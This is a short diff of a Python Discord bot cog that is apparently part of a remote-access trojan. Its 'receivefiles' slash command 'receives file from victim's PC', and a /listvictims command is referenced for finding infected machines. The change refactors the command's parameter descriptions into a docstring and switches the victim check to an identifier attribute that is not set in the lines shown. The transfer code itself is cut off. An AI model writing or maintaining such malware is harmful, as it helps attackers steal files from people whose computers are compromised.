@@ -10,15 +10,16 @@ class ReceiveFiles(commands.Cog):
         self.bot = bot
         self.ip_addr = self.bot.ip_addr
         
-    @commands.slash_command(
-        description="Receives file from victim's PC",
-        options=[
-            self.bot.victim,
-            discord.Option("file_path", description="Path of the file for receiving", required=True),
-        ]
-    )
+    @commands.slash_command()
     async def receivefiles(self, ctx, victim, file_path):
-        if str(victim) == str(self.ip_addr):
+        """Receives file from victim's PC.
+
+        Parameters
+        ----------
+        victim: Identifier of the affected computer (found via /listvictims).
+        file_path: Path of the file for receiving.
+        """
+        if str(victim) == str(self.identifier):
             await ctx.response.defer()
             
             if '"' in file_path:
